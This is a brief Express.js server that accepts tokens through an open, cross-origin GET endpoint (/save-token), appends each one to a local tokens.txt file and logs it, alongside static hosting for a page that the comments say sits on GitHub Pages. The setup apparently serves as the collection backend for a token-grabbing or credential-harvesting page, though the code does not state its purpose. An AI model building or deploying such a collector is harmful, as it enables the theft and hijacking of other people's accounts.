const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

// Enable CORS for all routes
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*'); // Allow any domain (replace * with your GitHub Pages URL in production)
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// Serve static files (like your GitHub Pages HTML)
app.use(express.static('public'));

// Endpoint to save the token to a file
app.get('/save-token', (req, res) => {
  const token = req.query.token;
  if (token) {
    fs.appendFile('tokens.txt', `${token}\n`, (err) => {
      if (err) {
        console.error('Error saving token:', err);
        return res.status(500).send('Error saving token');
      }
      console.log('Token saved:', token);
      res.send('Token saved successfully!');
    });
  } else {
    res.status(400).send('No token provided');
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});